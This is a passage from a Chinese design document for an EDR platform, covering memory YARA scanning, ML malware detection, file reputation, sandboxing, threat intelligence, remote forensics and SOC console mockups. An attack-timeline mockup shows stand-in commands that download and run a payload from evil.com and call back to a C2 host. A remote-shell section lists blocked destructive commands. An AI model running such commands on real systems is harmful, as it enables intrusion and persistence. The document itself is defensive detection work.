│  4. yara-x 扫描: 使用内存专用规则集 (shellcode/implant)  │
│  5. 结果:                                                 │
│     命中 → 生成 memory_threat 告警 (severity: critical)  │
│     包含: 命中规则、内存地址范围、进程信息、hex dump 摘要│
│     未命中 → 仅记录扫描日志                               │
│                                                          │
│  YARA 内存规则集:                                         │
│    mxsec-rules/yara/memory/                              │
│    ├── shellcode_generic.yar     # 通用 shellcode 特征   │
│    ├── cobalt_strike_beacon.yar  # CS Beacon 内存特征    │
│    ├── meterpreter.yar           # Meterpreter 内存特征  │
│    ├── sliver_implant.yar        # Sliver C2 内存特征    │
│    ├── elf_in_memory.yar         # 内存中 ELF 头检测     │
│    └── custom_implant.yar        # 自定义 implant 特征   │
│                                                          │
│  性能约束:                                                │
│  • 单次扫描最大内存: 100MB (超出则分段扫描)              │
│  • 单次扫描超时: 5s                                       │
│  • 并发扫描进程数: 最多 2 个 (避免 I/O 竞争)            │
│  • 扫描优先级: nice 19 (最低调度优先级)                  │
│  • 总 CPU 占用目标: < 5% (单次扫描期间)                  │
│                                                          │
│  与用户态降级的关系:                                      │
│  • /proc/[pid]/mem 读取不依赖 eBPF → 用户态模式也可用   │
│  • 差异: eBPF 提供触发信号 (实时), 用户态靠定时扫描     │
│  • 用户态降级方案见十一章 11.2 节第 4 项                 │
└──────────────────────────────────────────────────────────┘
```

### 21.3 无文件攻击检测规则示例

```yaml
# 内存威胁检测规则示例
id: MXEDR-MEM-001
name: memfd_fileless_exec
version: 1
category: memory
severity: critical
mitre:
  tactic: defense_evasion
  technique: T1620
tags: [fileless, memory, advanced]

requires:
  capabilities: [ebpf_memory]

agent:
  enabled: true
  action: alert
  enforce: false
  match:
    event_type: memory_exec
    conditions:
      - field: sub_type
        op: equals
        value: "memfd_create"
      - field: exe
        op: not_in
        value: ["runc", "containerd-shim", "pulseaudio"]
    logic: and

server:
  enabled: true
  cel: >
    event_type == "memory_exec" &&
    sub_type == "memfd_create" &&
    !ancestor_has("containerd") &&
    !ancestor_has("dockerd") &&
    uid != 0 || (uid == 0 && first_seen(exe, 1))

yara:
  trigger: true
  scan_target: process_memory
  rule_tags: [shellcode, implant]
```

---

## 二十二、ML 检测引擎

用机器学习弥补规则引擎无法覆盖的"未知威胁"盲区：Agent 端静态 ML 判定恶意文件，Server 端行为 ML 增强 BDE 异常检测。

### 22.1 Agent 端静态 ML（ELF 恶意文件分类）

```
┌──────────────────────────────────────────────────────────┐
│  Agent 端 ML 推理引擎                                     │
│                                                          │
│  运行时: ONNX Runtime (Go binding, CPU 推理)             │
│  模型大小: < 5MB (量化后 int8)                           │
│  推理延迟: < 5ms (单文件)                                │
│  内存占用: ~20MB (模型加载 + 推理缓冲)                    │
│                                                          │
│  触发时机:                                                │
│    process_exec 事件 → exe_path 文件                      │
│    file_write 事件 → 新创建的可执行文件                   │
│    仅对 file_reputation == unknown 的文件执行 ML          │
│    (known_good 直接放行, known_bad 直接告警, 不浪费推理)  │
│                                                          │
│  ELF 特征提取 (Agent 端, < 2ms):                         │
│  ┌────────────────────────────────────────────────────┐  │
│  │ 结构特征 (40 维):                                   │  │
│  │ • ELF header: e_type, e_machine, e_entry           │  │
│  │ • 节区统计: section_count, 各节区大小比例           │  │
│  │ • 段统计: segment_count, PT_LOAD/PT_DYNAMIC 特征   │  │
│  │ • 导入函数: 高危 API 数量 (execve/system/ptrace/    │  │
│  │   dlopen/mmap/connect/socket/fork)                  │  │
│  │ • 导出函数数量, 符号表大小                          │  │
│  │                                                     │  │
│  │ 统计特征 (30 维):                                   │  │
│  │ • 文件大小, 文件熵值 (整体 + 各节区)                │  │
│  │ • 字符串统计: 可打印字符串数, 平均长度, URL 数量    │  │
│  │ • 高熵节区占比 (加壳/混淆指标)                      │  │
│  │ • 字节 n-gram 特征 (Top 256 bigram 频率)            │  │
│  │                                                     │  │
│  │ 行为指标 (10 维):                                   │  │
│  │ • 是否 stripped, 是否静态链接                        │  │
│  │ • 是否有调试信息, 是否有 RELRO/NX/PIE              │  │
│  │ • 是否 UPX 加壳 (magic 检测)                       │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  模型架构:                                                │
│    Gradient Boosted Trees (LightGBM → ONNX 导出)         │
│    选择原因: CPU 推理快 (<5ms), 不需要 GPU,               │
│             80 维特征输入, 可解释性好 (feature importance) │
│    输出: malicious_probability (0.0 ~ 1.0)               │
│                                                          │
│  判定策略:                                                │
│    prob < 0.3  → 放行 (标记 ml_verdict: benign)          │
│    0.3 ~ 0.7  → 上报 Server 复核 (标记 ml_verdict: gray) │
│    prob > 0.7  → 告警 (标记 ml_verdict: malicious)       │
│    prob > 0.9  → 告警 + 建议隔离 (enforce 模式下自动隔离)│
│                                                          │
│  灰度区文件处理 (0.3 ~ 0.7):                             │
│    • 提交 Server 端 ML 复核 (更大模型)                   │
│    • 提交沙箱动态分析 (如果配置了沙箱)                    │
│    • 结果回写文件信誉库                                   │
└──────────────────────────────────────────────────────────┘
```

### 22.2 Server 端行为 ML

```
┌──────────────────────────────────────────────────────────┐
│  Server 端 ML 增强                                        │
│                                                          │
│  1. 异常检测模型 (增强 BDE)                               │
│  ─────────────────────────────────────────────────────── │
│  模型: Isolation Forest (scikit-learn 训练 → ONNX 导出)  │
│  输入: BDE 4 维行为画像的统计特征向量 (聚合后 ~50 维)    │
│  训练数据: ClickHouse 历史事件 (7 天基线期数据)           │
│  输出: anomaly_score (-1.0 ~ 1.0, 越高越异常)            │
│                                                          │
│  与 BDE 统计偏差的协同:                                   │
│    final_risk_score = 0.6 × bde_score + 0.4 × ml_score  │
│    两者互补:                                              │
│    • BDE 统计: 检测已知模式偏差 (快, 可解释)             │
│    • ML 模型: 检测高维空间异常 (准, 覆盖面广)            │
│                                                          │
│  2. 文件复核模型 (Agent 灰度区文件二次判定)               │
│  ─────────────────────────────────────────────────────── │
│  模型: 更大的 GBT 模型 (500 棵树 vs Agent 端 100 棵)     │
│  额外特征: 文件信誉评分 + IOC 关联 + 全局首见时间        │
│  推理环境: Server 端, 不受 Agent 资源限制                │
│  输出: 覆盖 Agent 判定, 结果回写文件信誉库                │
│                                                          │
│  3. 告警优先级模型 (降低分析师工作量)                     │
│  ─────────────────────────────────────────────────────── │
│  模型: Logistic Regression                               │
│  输入: 告警特征 (规则置信度/主机历史/故事线阶段数/        │
│        BDE分数/IOC命中数/文件信誉)                        │
│  输出: true_positive_probability                         │
│  用途: 告警列表按 TP 概率排序, 分析师优先处理高概率告警  │
│  训练数据: 分析师历史标记 (confirmed/false_positive)      │
└──────────────────────────────────────────────────────────┘
```

### 22.3 模型生命周期管理

```
┌──────────────────────────────────────────────────────────┐
│  模型管理 (ModelManager)                                  │
│                                                          │
│  模型版本化:                                              │
│    存储: Server 端 /var/lib/mxsec/models/                │
│    格式: {model_name}_{version}.onnx + metadata.json     │
│    metadata: 训练时间/数据集/指标(precision/recall/F1)/   │
│              特征列表/量化方式                            │
│    签名: Ed25519 签名 (与规则签名共用 CA)                │
│                                                          │
│  模型下发:                                                │
│    Server → Agent (gRPC 分块传输, 支持断点续传)          │
│    Agent 验签 → 加载到 ONNX Runtime → 热替换旧模型       │
│    热替换: 新模型加载成功后原子替换指针, 无检测间断       │
│                                                          │
│  模型灰度:                                                │
│    新模型标记 rollout_percent: 5                          │
│    灰度主机: shadow 模式 (新旧模型同时推理, 只用旧模型)  │
│    → 对比新旧模型结果差异 → 24h 无退化 → 切换到新模型   │
│    → 有退化 → 自动回退 + 告警通知                        │
│                                                          │
│  模型训练 Pipeline (离线):                                │
│    数据源: ClickHouse 历史事件 + 分析师标注               │
│    训练环境: 独立服务器 (GPU 可选, GBT 不需要 GPU)       │
│    训练频率: 每月重训 / 重大事件后临时重训                │
│    评估: 5-fold 交叉验证 + holdout 测试集                │
│    验收标准:                                              │
│      静态 ML: precision > 95%, recall > 85%, FPR < 1%    │
│      行为 ML: anomaly recall > 80%, FPR < 5%             │
│    通过 → 签名 → 入库 → 灰度下发                        │
│                                                          │
│  训练数据集:                                              │
│    恶意样本: MalwareBazaar + EMBER + VirusTotal 标记      │
│    正常样本: 平台自身采集 + NSRL 正常文件库               │
│    行为数据: 平台自身 ClickHouse 事件 (最大数据优势)      │
│    社区共享: 匿名化特征向量 (非原始文件) 社区互享         │
└──────────────────────────────────────────────────────────┘
```

---

## 二十三、文件信誉与沙箱集成

### 23.1 文件信誉服务

```
┌──────────────────────────────────────────────────────────┐
│  文件信誉服务 (FileReputationService)                     │
│                                                          │
│  信誉等级:                                                │
│    known_good    — 已知安全 (NSRL / 管理员白名单 / 签名) │
│    unknown       — 未知文件 (需 ML + 沙箱判定)           │
│    suspicious    — 可疑 (ML 灰度区 / 单源 IOC 命中)      │
│    known_bad     — 已知恶意 (多源 IOC / 沙箱确认 / ML)   │
│                                                          │
│  信誉库存储:                                              │
│    Server 端: Redis Hash                                 │
│      key: file_reputation:{sha256}                       │
│      fields: verdict, score, sources, first_seen,        │
│              last_seen, scan_results, ml_prob             │
│    容量: ~2000 万条 hash (~3GB Redis 内存)               │
│                                                          │
│  信誉数据来源:                                            │
│    1. NSRL (National Software Reference Library)          │
│       → ~3000 万已知正常软件 hash → known_good           │
│    2. MalwareBazaar 恶意样本 hash → known_bad            │
│    3. VirusTotal API (按需查询, 非全量)                   │
│       → VT score > 10/70 → known_bad                    │
│       → VT score 1~10 → suspicious                      │
│       → VT score 0 → 不更新 (不代表安全)                 │
│    4. 平台自身 ML 判定 → 更新 verdict                    │
│    5. 沙箱分析结果 → 更新 verdict                         │
│    6. 分析师手动标记 → 最高优先级                         │
│                                                          │
│  查询流程 (分层, 低延迟优先):                             │
│                                                          │
│  Agent 端:                                                │
│    L1: 本地 Bloom Filter (known_good, 50 万条, < 1μs)    │
│      → 命中: 已知安全, 跳过后续检测                       │
│    L2: 本地 LRU Cache (最近查询结果, 1 万条, < 1μs)      │
│      → 命中: 返回缓存结果                                 │
│    L3: Server 查询 (gRPC, < 5ms)                         │
│      → Server 查 Redis → 返回 verdict                    │
│    L4: 未知文件 → 上报 Server 异步处理                    │
│      → ML 推理 + 可选沙箱提交 → 结果异步回写             │
│                                                          │
│  更新策略:                                                │
│    • NSRL: 每季度全量更新                                 │
│    • MalwareBazaar: 每小时增量同步                        │
│    • VirusTotal: 按需查询 (对 unknown 文件, 限频)        │
│    • 平台自身: 实时更新 (ML/沙箱/分析师标记)              │
│    • Agent Bloom Filter: 每日增量同步                     │
└──────────────────────────────────────────────────────────┘
```

### 23.2 沙箱集成

```
┌──────────────────────────────────────────────────────────┐
│  沙箱集成 (SandboxIntegration)                            │
│                                                          │
│  对接方式: API 适配器模式 (支持多种后端)                  │
│                                                          │
│  ┌──────────────────┐                                    │
│  │ SandboxAdapter    │ ← interface                       │
│  │  Submit(file)     │                                    │
│  │  GetResult(id)    │                                    │
│  │  GetStatus(id)    │                                    │
│  └──────┬───────────┘                                    │
│         ├── CAPEAdapter      (CAPE Sandbox, 自建)        │
│         ├── CuckooAdapter    (Cuckoo Sandbox, 自建)      │
│         ├── VTAdapter        (VirusTotal API, SaaS)      │
│         ├── HybridAdapter    (Hybrid Analysis, SaaS)     │
│         └── CustomAdapter    (自定义 Webhook)             │
│                                                          │
│  提交策略:                                                │
│    自动提交条件:                                          │
│    • Agent ML 判定 suspicious (0.3~0.7)                  │
│    • file_reputation == unknown + 首次出现 + 有外连       │
│    • 规则命中但 severity == medium (需确认)               │
│    手动提交: 分析师通过 UI/API 提交指定文件               │
│                                                          │
│  提交流程:                                                │
│    1. Agent 采集文件 → 加密上传 Server 临时存储           │
│    2. Server 提交沙箱 API → 获取 task_id                 │
│    3. 轮询沙箱状态 (间隔 30s, 超时 10min)                │
│    4. 获取分析报告:                                       │
│       • 行为摘要 (进程创建/文件操作/网络连接/注册表)      │
│       • 恶意行为标记 (C2 通信/持久化/提权/逃逸)          │
│       • 恶意评分 + 分类标签                               │
│    5. 结果处理:                                           │
│       • 更新文件信誉库 (verdict + 沙箱报告)               │
│       • 恶意确认 → 自动生成/升级告警                      │
│       • 提取 IOC → 注入威胁情报库 (IP/Domain/Hash)       │
│       • 通知提交者 (如果是手动提交)                       │
│                                                          │
│  沙箱部署:                                                │
│    推荐: CAPE Sandbox (CAPE v2)                           │
│    • 开源, 支持 Linux + Windows 分析环境                  │
│    • API 兼容 Cuckoo, 社区活跃                            │
│    • 部署: 独立服务器, 与 MxSec Server 同网络             │
│    • 可选: 不部署沙箱, 仅用 VirusTotal API 替代          │
└──────────────────────────────────────────────────────────┘
```

---

## 二十四、多源威胁情报平台

### 24.1 情报聚合引擎

```
┌──────────────────────────────────────────────────────────┐
│  威胁情报平台 (Threat Intelligence Platform)              │
│                                                          │
│  情报源适配器:                                            │
│  ┌──────────────┐                                        │
│  │ TISourceAdapter │ ← interface                         │
│  │  Fetch()        │    // 拉取最新情报                   │
│  │  Transform()    │    // 转换为统一格式                 │
│  │  Health()       │    // 源健康状态                     │
│  └──────┬─────────┘                                      │
│         ├── AbuseCHSource                                │
│         │   • Feodo Tracker (C2 IP)                      │
│         │   • URLhaus (恶意 URL)                          │
│         │   • MalwareBazaar (恶意文件 hash)               │
│         │   • ThreatFox (IOC 综合)                        │
│         │   • 更新频率: 每小时                            │
│         │                                                │
│         ├── AlienVaultOTXSource                           │
│         │   • Pulse (社区情报订阅)                         │
│         │   • IP/Domain/Hash/URL 指标                     │
│         │   • 更新频率: 每小时                            │
│         │                                                │
│         ├── MISPSource                                    │
│         │   • 对接 MISP 实例 (STIX/TAXII)                │
│         │   • 支持自建 MISP + 社区 MISP 订阅             │
│         │   • 更新频率: 实时事件推送                      │
│         │                                                │
│         ├── VirusTotalSource                              │
│         │   • Livehunt (YARA 规则命中通知)                │
│         │   • Retrohunt (历史样本搜索)                    │
│         │   • 按需查询 (单文件信誉, 限频 4 次/分钟)      │
│         │                                                │
│         ├── EmergingThreatsSource                         │
│         │   • ET Open 规则集 (Suricata 兼容)              │
│         │   • IP/Domain 黑名单                            │
│         │                                                │
│         └── CustomFeedSource                              │
│             • 自定义 CSV/JSON/STIX 导入                   │
│             • Webhook 实时推送接收                        │
│             • 管理员手动添加                               │
│                                                          │
│  统一情报格式 (内部存储):                                 │
│  {                                                       │
│    "ioc_type": "ip|domain|hash|url",                     │
│    "value": "45.33.32.100",                              │
│    "sources": ["abusech", "otx", "misp"],                │
│    "source_count": 3,                                    │
│    "confidence": 92,          // 0-100                   │
│    "severity": "high",                                   │
│    "tags": ["c2", "cobalt_strike", "APT29"],             │
│    "first_seen": "2026-05-01T00:00:00Z",                 │
│    "last_seen": "2026-05-15T08:30:00Z",                  │
│    "expires_at": "2026-06-15T00:00:00Z",                 │
│    "related_iocs": ["hash:abc123..."],                   │
│    "mitre_techniques": ["T1071.001"]                     │
│  }                                                       │
└──────────────────────────────────────────────────────────┘
```

### 24.2 情报评分与老化

```
情报置信度评分 (多源交叉验证):
  ─────────────────────────────────────────────────
  confidence = base_score × source_multiplier × age_decay

  base_score (按源质量):
    VirusTotal VT>10:  90
    abuse.ch:          80
    MISP (verified):   80
    AlienVault OTX:    60
    自定义 Feed:       50
    管理员手动:        95

  source_multiplier (多源命中加成):
    1 源: ×1.0  |  2 源: ×1.2  |  3+ 源: ×1.4
    上限: 100

  age_decay (时间衰减):
    < 7 天:   ×1.0
    7~30 天:  ×0.9
    30~90 天: ×0.7
    > 90 天:  ×0.5
    > 180 天: 自动归档 (不删除, 从活跃库移出)

情报老化管理:
  • 每日凌晨执行老化任务
  • 过期情报移至 ClickHouse 归档表 (仍可通过 MQL 查询)
  • Redis 活跃库仅保留未过期情报 (控制内存)
  • 同一 IOC 被新源确认 → 重置 age_decay
```

---

## 二十五、远程取证与响应

### 25.1 远程 Shell

```
┌──────────────────────────────────────────────────────────┐
│  远程安全 Shell (RemoteShell)                             │
│                                                          │
│  传输: gRPC 双向流 (ServerStream + ClientStream)          │
│  加密: 基于已有 mTLS 通道, 端到端加密                     │
│                                                          │
│  功能:                                                    │
│    • 远程命令执行 (非交互式): 发送命令 → 返回输出         │
│    • 交互式 Shell (PTY): 管理后台嵌入终端模拟器           │
│    • 文件浏览: ls / stat / find (不执行本地 Shell)        │
│                                                          │
│  安全约束:                                                │
│    权限:                                                  │
│    • 需要 remote_shell 角色 (最高权限, 仅安全管理员)      │
│    • 每次会话需输入二次确认密码 (或 MFA)                  │
│    • 不允许对 隔离中 的主机执行 Shell (需先解除隔离)      │
│                                                          │
│    审计:                                                  │
│    • 每条命令 + 输出完整记录到审计日志 (不可删除)          │
│    • 审计日志: 操作人 / 时间 / 目标主机 / 命令 / 输出     │
│    • 会话录制: 交互式 Shell 全程录制 (asciinema 格式)     │
│                                                          │
│    限制:                                                  │
│    • 会话超时: 30 分钟无操作自动断开                       │
│    • 同时在线: 每台主机最多 1 个 Shell 会话                │
│    • 危险命令拦截: rm -rf / mkfs / dd / shutdown 等       │
│      → 需二次确认                                        │
│    • 命令白名单模式 (可选): 仅允许预定义的取证命令        │
│                                                          │
│  Agent 端实现:                                            │
│    • gRPC Service: RemoteShellService.Execute(stream)     │
│    • 启动 /bin/bash (或配置的 Shell) 子进程               │
│    • 用 PTY 包装 → 输入/输出通过 gRPC stream 传输        │
│    • Agent 自身进程产生的事件不触发 EDR 规则              │
│      (通过 pid 自排除)                                   │
└──────────────────────────────────────────────────────────┘
```

### 25.2 远程文件获取与内存 Dump

```
远程取证能力:
  ─────────────────────────────────────────────────

  1. 文件获取 (File Retrieval)
     请求: 分析师指定 host_id + file_path
     流程:
       Server gRPC → Agent 读取文件
       → 计算 SHA256 → 压缩 (gzip)
       → 分块传输 (每块 1MB) → Server 存储
     限制:
       • 单文件上限 100MB
       • 存储: Server 端临时目录, 7 天自动清理
       • 权限: 需要 forensics 角色

  2. 内存 Dump (Memory Dump)
     请求: 分析师指定 host_id + pid
     流程:
       Server gRPC → Agent 读取 /proc/[pid]/mem
       → 仅导出可疑区域 (anon + exec, 非全量)
       → 压缩 + 分块传输 → Server 存储
     后续:
       • Server 端 YARA 深度扫描 (完整规则库)
       • 可下载供离线分析 (Volatility / 手动逆向)
     限制:
       • 单进程上限 500MB
       • 目标进程不受影响 (仅读取 /proc/pid/mem)

  3. 取证包 (Forensics Package)
     请求: Playbook collect_forensics 动作 或 手动触发
     内容:
       • 进程列表 (/proc 快照)
       • 进程树 (Agent 内存树导出)
       • 网络连接 (/proc/net/tcp + /proc/net/udp)
       • 打开文件 (/proc/[pid]/fd)
       • 最近文件变更 (find -mtime -1)
       • crontab 内容
       • systemd 服务列表
       • 用户列表 + 最近登录
       • 内核模块列表
       • iptables 规则
       • 高危进程调用栈 (/proc/[pid]/stack, 命中 critical 规则时自动抓取)
       • Agent 本地告警缓存
     格式: JSON 打包 → gzip → 上传 Server
     存储: ClickHouse (长期) + 文件系统 (临时)
```

---

## 二十六、安全运营前端 (SOC Console)

以安全运营中心 (SOC) 工作流为核心设计前端，覆盖检测→分析→响应→复盘全流程。

### 26.1 前端架构

```
技术栈: Vue3 + TypeScript + Ant Design Vue + Pinia + Vite
  (与平台现有前端一致, 无额外学习成本)

路由结构:
  /dashboard                    — 态势感知大屏
  /alerts                       — 告警中心
  /alerts/:id                   — 告警详情
  /storylines                   — 攻击故事线
  /storylines/:id               — 故事线详情 (时间线+进程树)
  /hunting                      — 威胁狩猎 (MQL)
  /hunting/tasks                — 定时狩猎任务
  /hosts                        — 主机管理
  /hosts/:id                    — 主机详情 (资产+告警+行为)
  /hosts/:id/shell              — 远程 Shell (嵌入终端)
  /rules                        — 规则管理
  /rules/editor                 — 规则编辑器 (YAML)
  /playbooks                    — Playbook 管理
  /playbooks/:id/executions     — Playbook 执行历史
  /intelligence                 — 威胁情报
  /intelligence/ioc             — IOC 管理
  /intelligence/reputation      — 文件信誉查询
  /intelligence/sandbox         — 沙箱任务
  /reports                      — 报告中心
  /settings                     — 系统设置
  /settings/models              — ML 模型管理
  /settings/integrations        — 第三方集成
  /audit                        — 审计日志
```

### 26.2 态势感知大屏

```
┌─────────────────────────────────────────────────────────────┐
│  MxSec 安全态势感知                              实时刷新 5s│
│                                                             │
│  ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌─────────┐ ┌──────┐│
│  │ 主机总数 │ │ 活跃告警 │ │ 故事线   │ │ 今日事件 │ │ 威胁 ││
│  │  1,247   │ │   47    │ │  3 活跃  │ │  2.4M   │ │ 评分 ││
│  │ 在线1230 │ │ 8 严重  │ │ 12 今日  │ │ 1.9K EPS│ │  72  ││
│  └─────────┘ └─────────┘ └─────────┘ └─────────┘ └──────┘│
│                                                             │
│  ┌─ 攻击趋势 (7天) ──────────────┐ ┌─ MITRE ATT&CK 热力图 ┐│
│  │  ███                          │ │                       ││
│  │  ████                         │ │  [14个战术×技术点矩阵] ││
│  │  ██████                       │ │  颜色深度=命中频率     ││
│  │  ████                         │ │  点击跳转对应告警      ││
│  │  ███████ ← 今日               │ │                       ││
│  └───────────────────────────────┘ └───────────────────────┘│
│                                                             │
│  ┌─ 活跃故事线 Top 5 ────────────┐ ┌─ 全球威胁地图 ────────┐│
│  │ #S-1247 score:100 勒索软件     │ │                       ││
│  │   execution→persistence→cred  │ │  [世界地图, 攻击源IP  ││
│  │ #S-1302 score:60  C2回连       │ │   按 GeoIP 标注]     ││
│  │   execution→c2               │ │  实时连线动画          ││
│  │ ...                           │ │                       ││
│  └───────────────────────────────┘ └───────────────────────┘│
│                                                             │
│  ┌─ 系统健康 ────────────────────────────────────────────┐  │
│  │ Agent: 1230/1247 在线 (98.6%)  EPS: 1,923             │  │
│  │ Kafka lag: 342  Consumer: 3/3  Redis: 2.1GB/8GB       │  │
│  │ ClickHouse: 45% disk  ML模型: v2.3 (100% 覆盖)       │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### 26.3 告警中心

```
┌─────────────────────────────────────────────────────────────┐
│  告警中心                                                    │
│                                                             │
│  筛选: [严重等级▼] [状态▼] [主机▼] [规则▼] [时间范围]  [搜索]│
│  批量操作: [确认] [误报] [分配给] [关联故事线] [导出]        │
│                                                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ ⚠ 状态    等级     规则               主机      时间   │  │
│  │───────────────────────────────────────────────────────│  │
│  │ ● 新建   critical  反弹Shell-bash     host-092  14:23 │  │
│  │          ML:0.95   故事线:#S-1247                     │  │
│  │ ● 新建   high      C2回连-外部IP      host-092  14:25 │  │
│  │          IOC命中:3源  信誉:known_bad                  │  │
│  │ ◐ 处理中  high     crontab持久化      host-017  11:05 │  │
│  │          分配给: @analyst-01                          │  │
│  │ ○ 已关闭  medium   异常文件写入        host-155  09:30 │  │
│  │          结论: 误报 (运维脚本)                         │  │
│  └───────────────────────────────────────────────────────┘  │
│                                                             │
│  告警生命周期:                                               │
│    新建 → 处理中 (分配分析师) → 已确认/误报/已忽略          │
│    已确认 → 已关闭 (响应完成) / 已升级 (转为事件)           │
│                                                             │
│  告警详情页包含:                                             │
│    • 事件上下文 (进程树 + cmdline + 环境)                    │
│    • 规则命中详情 (哪条规则 + CEL 表达式 + 匹配字段)        │
│    • ML 判定详情 (ml_prob + 特征重要性 Top 10)              │
│    • BDE 行为偏差详情 (4 维偏差分数)                        │
│    • 文件信誉详情 (信誉等级 + 来源 + 沙箱报告)             │
│    • IOC 命中详情 (命中源 + 置信度 + 关联 IOC)             │
│    • 故事线关联 (属于哪个故事线 + 阶段)                     │
│    • 相似告警 (同规则/同主机历史告警)                       │
│    • 响应动作 (可执行: kill/隔离/封IP/提交沙箱/Playbook)    │
│    • 评论区 (分析师协作笔记)                                │
└─────────────────────────────────────────────────────────────┘
```

### 26.4 故事线视图

```
┌─────────────────────────────────────────────────────────────┐
│  故事线 #S-1247                                  score: 100 │
│  状态: 活跃  主机: host-092, host-017   持续: 2h 14min      │
│                                                             │
│  ┌─ 攻击阶段 ──────────────────────────────────────────┐    │
│  │ [初始访问]   [执行✓]   [持久化✓]   [凭据✓]   [C2✓] │    │
│  │              ██████    ████████    ██████    ████   │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                             │
│  ┌─ 时间线 ───────────────────────────────────────────┐     │
│  │                                                     │     │
│  │  14:23:01 ▶ wget http://evil.com/payload.sh         │     │
│  │   host-092  [MXEDR-0105 download_exec] severity:high│     │
│  │   ML: 0.92  IOC: evil.com(3源,conf:95)              │     │
│  │                                                     │     │
│  │  14:23:03 ▶ chmod +x /tmp/payload.sh                │     │
│  │   host-092  (关联事件, 无告警)                       │     │
│  │                                                     │     │
│  │  14:23:05 ▶ /tmp/payload.sh → bash → curl c2.evil   │     │
│  │   host-092  [MXEDR-0071 c2_callback] severity:high  │     │
│  │                                                     │     │
│  │  14:23:08 ▶ echo "*/5 * * * * ..." >> crontab       │     │
│  │   host-092  [MXEDR-0037 crontab_persist] medium     │     │
│  │                                                     │     │
│  │  14:35:12 ● SSH host-092 → host-017                 │     │
│  │   (跨主机横向移动, 关联子故事线 #S-1248)            │     │
│  │                                                     │     │
│  └─────────────────────────────────────────────────────┘     │
│                                                             │
│  ┌─ 进程树 ──────────────────┐  ┌─ 动作 ────────────────┐  │
│  │ sshd(1024)                │  │ [隔离主机]             │  │
│  │ └─bash(2048)              │  │ [终止攻击进程树]       │  │
│  │   └─wget(2049) ★          │  │ [执行Playbook: PB-001] │  │
│  │   └─payload.sh(2050) ★    │  │ [远程Shell]            │  │
│  │     ├─curl(2051) ★        │  │ [收集取证包]           │  │
│  │     ├─cat(2052) ★         │  │ [标记已处理]           │  │
│  │     └─ssh(2053) ★ →host17 │  │ [导出PDF报告]          │  │
│  │                           │  │                       │  │
│  │ ★ = 属于本故事线的节点     │  │                       │  │
│  └───────────────────────────┘  └───────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### 26.5 主机详情页

```
┌─────────────────────────────────────────────────────────────┐
│  主机: host-092                                              │
│  IP: 10.0.1.92  OS: Ubuntu 22.04  Kernel: 5.15.0           │
│  Agent: v1.2.0  模式: eBPF Full  Hook: fentry  状态: ● 在线│
│                                                             │
│  [概览] [告警] [事件] [进程] [行为画像] [隔离] [远程Shell]   │
│                                                             │
│  ── 概览 Tab ──                                             │
│  ┌─ 资产信息 ─────────┐  ┌─ Agent 健康 ─────────────────┐  │
│  │ CPU: 4C / 内存: 8G  │  │ CPU: 2.3% / MEM: 42MB       │  │
│  │ 磁盘: 80G (45%)    │  │ 规则: 185/200 已加载         │  │
│  │ 容器: containerd    │  │ 降级: Level 0 (正常)          │  │
│  │ K8s: node-03        │  │ WAL: 0.3MB (正常)            │  │
│  │ 组: production-web  │  │ ML模型: v2.3 已加载           │  │
│  └────────────────────┘  └──────────────────────────────┘  │
│                                                             │
│  ── 行为画像 Tab ──                                         │
│  ┌─ 行为基线状态 ────────────────────────────────────────┐  │
│  │ 学习状态: 已成熟 (14天)  上次更新: 5分钟前            │  │
│  │                                                       │  │
│  │ nginx (risk_score: 12/100 正常)                       │  │
│  │   子进程: {worker×4} ✓正常   文件: {/var/log/} ✓正常  │  │
│  │   网络: {10.0.1.x:80} ✓正常  syscall: 正常分布        │  │
│  │                                                       │  │
│  │ python3 (risk_score: 67/100 ⚠可疑)                   │  │
│  │   子进程: {curl} ★新增     文件: {/etc/} ★新增        │  │
│  │   网络: {45.33.x.x:4444} ★新增外连                    │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### 26.6 规则管理 + Playbook 管理

```
规则管理页面:
  ┌───────────────────────────────────────────────────────┐
  │ 规则列表                          [新建规则] [同步仓库]│
  │                                                       │
  │ 筛选: [等级▼] [类型▼] [状态▼] [MITRE▼] [来源▼]       │
  │                                                       │
  │ ID          名称            等级    命中    误报  状态 │
  │ MXEDR-0001  反弹Shell-bash  critical 234  3    ● 启用 │
  │ MXEDR-0042  shadow文件读取  medium   1847 412  ◐ 灰度 │
  │ MXEDR-MEM-1 memfd无文件     critical 12   0    ● 启用 │
  │                                                       │
  │ 规则详情:                                              │
  │ • YAML 源码查看 + 在线编辑器 (语法高亮 + 校验)        │
  │ • 运行时统计 (命中率/误报率/平均评估耗时)              │
  │ • 命中事件样本 (最近 10 条)                            │
  │ • 关联 MITRE 技术点                                    │
  │ • enforce 开关 (切换 alert ↔ 自动响应)                │
  │ • 灰度控制 (rollout_percent 滑块)                      │
  └───────────────────────────────────────────────────────┘

Playbook 管理页面:
  ┌───────────────────────────────────────────────────────┐
  │ Playbook 列表                          [新建Playbook]  │
  │                                                       │
  │ ID     名称            触发条件       最近执行  状态   │
  │ PB-001 勒索软件响应     [ransomware]   2h前     ● 启用 │
  │ PB-002 反弹Shell响应    [reverse_shell] 昨天    ● 启用 │
  │ PB-003 挖矿程序响应     [cryptominer]  3天前    ● 启用 │
  │                                                       │
  │ 执行历史:                                              │
  │ • 时间线视图: 每步执行状态 (成功/失败/等待审批)        │
  │ • 审批待办: 等待审批的步骤 + 一键审批                  │
  │ • 执行详情: 每步输入/输出/耗时                         │
  │                                                       │
  │ Playbook 编辑器:                                       │
  │ • 可视化流程图 (拖拽编排步骤)                          │
  │ • YAML 源码编辑 (高级用户)                             │
  │ • 步骤模板库 (从模板添加步骤)                          │
  │ • 测试运行 (dry_run 模式)                              │
  └───────────────────────────────────────────────────────┘
```

### 26.7 威胁情报 + 文件信誉页面

```
威胁情报页面:
  ┌───────────────────────────────────────────────────────┐
  │ IOC 情报总览                                           │
  │                                                       │
  │ 活跃 IOC: 2,847,321   来源: 6    今日新增: 1,247      │
  │                                                       │
  │ [IOC搜索]  输入 IP/Domain/Hash 查询命中情况            │
  │                                                       │
  │ 来源健康:                                              │
  │ ● abuse.ch     最后同步: 30min前  IOC数: 1,200,000    │
  │ ● AlienVault   最后同步: 1h前     IOC数: 800,000      │
